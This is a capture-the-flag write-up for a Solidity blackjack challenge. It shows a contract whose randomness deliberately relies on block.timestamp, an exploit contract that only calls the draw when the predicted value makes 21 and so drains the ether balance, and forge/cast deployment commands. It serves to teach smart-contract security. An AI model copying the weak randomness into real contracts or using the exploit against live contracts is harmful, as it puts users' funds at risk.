In a game of blackjack, the objectives are to get the closest to 21, both the dealer and the player are competing in this, but as you know a this game, here at least, is rigged so that you can win if you know how, let's see how we can always win in this game.
&nbsp;  
&nbsp;  
```solidity
function isSolved() external view returns (bool) {
    return blackjack.playerWon();
}
```
&nbsp;  
The *Setup.sol::isSolved()* will get the *Blackjack.sol::playerWon()* bool, this will return true if the player has won the game, let's move on to the *Blackjack.sol*
&nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: UNLICENSED
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

contract Blackjack{

    address public dealer;
    bool public playerWon;
    bool public dealerMoved;
    bool public playerMoved;
    bool public dealerWon;

    constructor() payable {
        require(msg.value == 30 ether, "Require 30 Ether to Start the game");
        dealer = msg.sender;
    }

    function playBlackjack(uint256 _choice) public {
        require(dealerWon == false, "Dealer has won the game");
        require(playerWon == false, "You've won the game!");
        uint256 playerCards = 17;
        uint256 dealerCards = 15;
        // You Have the first turn each time, you can choose either pass or draw
        // The dealer will always draw each turn, but... you can stall as long as you want.
        if(_choice == 1 && playerMoved != true){
            playerCards += uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
            playerMoved = true;
        }else if(_choice == 2 && dealerMoved != true){
            // player pass, but the dealer will draw
            uint256 toAdd = 6;
            dealerCards += toAdd;
            dealerMoved = true;
            dealerWon = true;
        }
        // Transfer all balance if the playerWon
        if(playerCards == 21){
            playerWon = true;
            (bool transfered, ) = payable(msg.sender).call{value: address(this).balance}("");
            require(transfered, "Reward failed to sent");
        }
    }

}
```
&nbsp;  
We are up against the dealer (which is Setup contract), looking deeper into *playBlackjack()*, we can notice that the randomness there are using *block.timestamp*, this is not recommended for giving a random value to a variable since it is very easy to predict. We can choose whose turn next, of course we want to take the initiative and draw our card, if not, the deealer will win regardless. We only got one chance, so we better make it count, we are not as detail as a smart contract, so to solve this lab, we are going to create an Exploit Contract, that will call the *playBlackjack* with the value of *1* (our move) and only call it when we got *+4* - since it will bring our card to 21 and if it does, we will have *playerWon()*, here is how we can do it
&nbsp;  
&nbsp;  
```solidity
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./Blackjack.sol";

contract Exploit {
    Setup public setup;
    Blackjack public BJ;

    constructor(address payable _setup) {
        setup = Setup(_setup);
        BJ = Blackjack(setup.blackjack());
    }

    function solveBlackjack() public willWin{
        BJ.playBlackjack(1);
    }

    modifier willWin(){
        uint256 randomGuesser = uint256(keccak256(abi.encodePacked(block.timestamp))) % 10;
        require(randomGuesser == 4, "YOU WON'T WIN THIS TIME");
        _;
    }

    receive() external payable{}
}
```
&nbsp;  
you don't have to use a *modifier*, you can also us a simple *if else* statement to check if you win or not, but here I'm using modifier to return a revert message. Now we just have to deploy the contract and solve it.
&nbsp;  
&nbsp;  
```bash
// deploying the exploit contract
forge create src/$PATH_TO_EXPLOIT:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR

// calling the solveBlackjack()
// you maybe luckly to call it once and solved it, but it may require you call it several times
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "solveBlackjack()"
```
&nbsp;  
Noy you can just click the `Flag` button to get your flag~